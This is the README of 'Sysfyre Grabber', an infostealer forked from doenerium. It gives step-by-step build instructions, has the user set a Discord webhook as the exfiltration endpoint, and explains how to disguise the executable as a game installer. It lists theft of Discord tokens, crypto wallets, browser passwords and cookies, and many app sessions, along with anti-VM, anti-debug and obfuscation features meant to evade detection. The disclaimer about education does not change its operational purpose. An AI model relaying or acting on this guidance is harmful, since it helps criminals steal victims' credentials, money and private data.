# ⚠️ Sysfyre Grabber ⚠️

---

|        Table of Contents          |
|-----------------------------------|
| [📁 Setup & Requirements](#setup)|
| [⚔️ Features](#features)         |
| [📝 To-Do](#to-do)                |
| [📜 License](#license)           |

<a id="setup"></a>

---

## 📁 Setup // Requirements

Install [Node.js](https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi) `IMPORTANT: Install NodeJS version 18.15.0`
 
***VERY IMPORTANT***: When installing Node.js also install **"Tools for Native Modules"** => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`

To avoid any circumstances. Please also install [the latest version of Visual Studio](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030) including the `"Desktop development with C++" workload."`.

**Note:** When installing Visual Studio with the **"Desktop development with C++"** workload make sure to also install `MSVC v141 - VS 2017 C++ x64/x86 build  tools`

Then run the **_install.bat_** file to install all necessary packages

If you are getting errors: Try running the **_fix.bat_** file to automatically fix common issues.

Replace _REPLACE_ME_ with your webhook url in **_config.js_**

Replace the **"default.ico"** file with the icon you would like to have on your executable. 
``The filetype must be ".ico"! and the icon should be 256x256 OR 128x128 but 256x256 works the best`` 

Lastly add a File Description, ProductName, LegalCopyright & OriginalFilename in ``config.js`` 

An example would be:
```
properties: {
    FileDescription: 'Best Game ever',
    ProductName: 'Best Game ever',
    LegalCopyright: 'Best Game ever ©️ 2023',
    OriginalFilename: 'BestGameEverSetup.exe'
}

```

Run **_build.bat_** and wait for a file with a similar name to **_doenerium_8AnBqvBG.exe_** to be built.

<a id="features"></a>

---

## ⚔️ Features

> Autostart (Startup)
>
> Discord Token
>
> Discord Info - Username, Phone number, Email, Billing, Nitro Status & Backup Codes
>
> Discord Friends with rare badges
>
> Grabs crypto wallets -
> 💸 Zcash
> 🚀 Armory
> 📀 Bytecoin
> 💵 Jaxx
> 💎 Exodus
> 📉 Ethereum
> 🔨 Electrum
> 🕹️ AtomicWallet
> 💹 Guarda
> ⚡ Coinomi
> 🦊 MetaMask
>
> Browser (Chrome, Opera, Firefox, OperaGX, Edge, Brave, Yandex) -
> Passwords, Cookies, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
>
> Screenshot(s)
>
> Telegram Session stealer
>
> FTP stealer (FileZilla)
>
> Minecraft Session stealer & validator
> 
> Instagram Session stealer & validator
> 
> Roblox Session stealer & validator
>
> Steam Session stealer & validator
>
> TikTok Session stealer & validator
>
> Twitter Session stealer & validator
>
> Reddit Session stealer & validator
>
> Growtopia save.dat stealer

#### Additionally...

> Internet connection check every 3 seconds before it starts stealing
>
> Ultra Obfuscation (use https://obfuscator.io)
>
> Anti-Debug
>
> Anti-VM
>
> Validates a found discord token and then sends it to your discord webhook
>
> Sends all files to your discord webhook in beautiful embeds and a structured zip file
>
> Automatic obfuscation when building

<a id="to-do"></a>

---

## 📝 To-Do

> - More grabbers (VPN's, Gaming, Messengers)
> - Keylogger
> - Discord bot to build within discord ($build <webhook_url>)
> - Dynamic encryption
> - Firefox stealer

<a id="license"></a>

---

## 📜 License

By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/).

---

#### Disclaimer

I am not responsible for any damages this software may cause after being acquired. This software was made for personal education and sandbox testing.

#### Credits

Credits to all prior contributors to doernium for creating this beautiful project for me to fork.

<p align="center"><a href=#top>Back to Top</a></p>
